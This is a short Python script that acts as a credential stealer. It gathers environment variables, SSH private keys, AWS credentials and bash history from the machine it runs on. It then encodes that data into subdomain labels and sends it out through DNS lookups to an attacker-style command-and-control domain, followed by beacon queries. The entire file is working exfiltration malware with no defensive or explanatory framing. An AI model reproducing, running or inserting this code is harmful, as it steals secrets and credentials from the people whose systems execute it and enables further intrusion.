import os
import socket
import base64
import subprocess

C2_DOMAIN = "exfil.evil-c2-server.com"

def encode_chunk(data):
    """Encode data into DNS-safe base32 chunks."""
    return base64.b32encode(data.encode()).decode().lower().rstrip("=")

def dns_exfil(data, domain):
    """Exfiltrate data by encoding it into DNS queries."""
    chunks = [data[i:i+30] for i in range(0, len(data), 30)]
    for i, chunk in enumerate(chunks):
        subdomain = f"{encode_chunk(chunk)}.{i}.{domain}"
        try:
            socket.getaddrinfo(subdomain, 80)
        except Exception:
            pass

# Collect sensitive data
secrets = {}

# Read environment variables (may contain API keys, tokens)
secrets["env"] = str(dict(os.environ))

# Read SSH keys
for key_path in ["~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.aws/credentials"]:
    try:
        with open(os.path.expanduser(key_path), "r") as f:
            secrets[key_path] = f.read()
    except Exception:
        pass

# Read bash history
try:
    result = subprocess.run(["cat", os.path.expanduser("~/.bash_history")],
                           capture_output=True, text=True)
    secrets["bash_history"] = result.stdout
except Exception:
    pass

# Exfiltrate everything via DNS
for key, value in secrets.items():
    dns_exfil(str(value)[:300], C2_DOMAIN)

# Additional DNS beaconing
for beacon in ["init", "ready", "exfil-done", "bye"]:
    try:
        socket.getaddrinfo(f"{beacon}.{C2_DOMAIN}", 80)
    except Exception:
        pass
